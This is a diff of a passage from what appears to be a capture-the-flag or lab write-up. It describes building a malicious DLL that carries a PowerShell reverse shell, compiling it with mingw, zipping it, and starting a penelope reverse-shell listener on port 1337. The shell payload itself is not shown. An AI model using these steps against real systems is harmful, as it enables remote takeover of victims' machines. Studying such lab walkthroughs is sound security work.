@@ -432,7 +432,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 Ill get a powershell reverse shell from revshells.com then place it in the code
 
 ```python
-x86_64-w64-mingw32-g++ -shared -o settings_update.dll settings_update.cpp -lwinmm
+❯❯❯ x86_64-w64-mingw32-g++ -shared -o settings_update.dll settings_update.cpp -lwinmm
 ```
 
 Ill then compile the code into the DLL
@@ -440,4 +440,14 @@ Ill then compile the code into the DLL
 ```python
 
 ```
+
+Then ill zip the DLL
+
+```python
+❯❯❯ penelope -p 1337                                        
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+Ill then start a listener
 
